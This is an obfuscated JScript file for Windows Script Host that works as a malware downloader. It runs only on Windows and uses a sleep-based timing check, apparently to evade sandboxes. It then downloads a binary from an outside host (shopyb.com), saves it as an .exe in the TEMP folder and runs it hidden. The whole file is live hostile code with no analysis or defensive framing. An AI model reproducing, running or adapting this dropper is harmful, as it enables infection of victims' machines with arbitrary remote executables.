var _G = false;
var _EK = "CreateObject";
var _EO = function _Q() {return WScript[_EK]("WScript"+".Shell");}(), _EP = 11;
var _AO = "MSXML2.XMLHTTP";
var _KK0 = 2123213;
var _KK = 0;
function _D(_W0){_EO["Run"](_W0, _KK, _KK);};
function _I(){return _AO + "";};
function _W(_XQ, _IH){_KK = _KK * 1; return _XQ - _IH;};
function _LR(){return _EK;};
/*@cc_on
  @if (@_win32 || @_win64)
    _G = true;
  @end
@*/
if (_G)
{
var _V = "";
function _HJ(){return 22;};
var _B0 = 0; var _S = 0;
function _A()
{
var _M0 = new this["Date"]();
var _ZJ = _M0["getUTCMilliseconds"]();
WScript["Sleep"](_HJ());
var _M0 = new this["Date"]();
var _F0 = _M0["getUTCMilliseconds"]();
WScript["Sleep"](_HJ());
var _M0 = new this["Date"]();
var _SJ = _M0["getUTCMilliseconds"]();
var _B0 = "_E";
_B0 = _W(_F0, _ZJ);
var _S = "_I0";
_S = _W(_SJ, _F0);
_V = "open";
return _W(_B0, _S);
}
var _CJ = false;
var _E0 = false;
for (var _F = _KK; _F < _HJ() * 1; _F++){if (_A() != _KK){
_CJ = true; 
_S = "31" + 11 * _B0 + _S; 
_E0 = true; 
break;
}}
function _NM() {return ((_CJ == true) && (_CJ == _E0)) ? 1 : _KK;};
if (_CJ && _NM() && _E0){
function _OY() {return _EO["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Ixpfxo71.ex" + "e";};
 _TA = _I();
 _D0 = WScript[_EK](_TA);
 var _ZN = 1;
 while (_ZN){
try {
	if (_ZN == 1)
	{
		_D0[_V]("GET", "http://shopyb.com/s6dlas", false);
		_D0["send"]();
		_FS = "Sleep";
	}
	WScript[_FS](_HJ() + 120); 
	if (_D0["readystate"] < 2 * 2) continue;
	_ZN = _KK;
	function _B(_GZ) {var _I1 = (1, 2, 3, 4, 5, _GZ); return _I1;};
	_A0 = WScript[_LR()]("ADODB.Stream");
	_TA = _A0;
	_TA[_V]();
	_TA["type"] = _B(1);
	_TA["write"](_D0["ResponseBody"]);
	_A0["position"] = _B(_KK);
	_TA["Save" + "ToFile"](_OY(), 2);
	_A0["cl"+"ose"]();
	_M = _OY();
	_D(_M);
} catch(_K){};
}
}
}

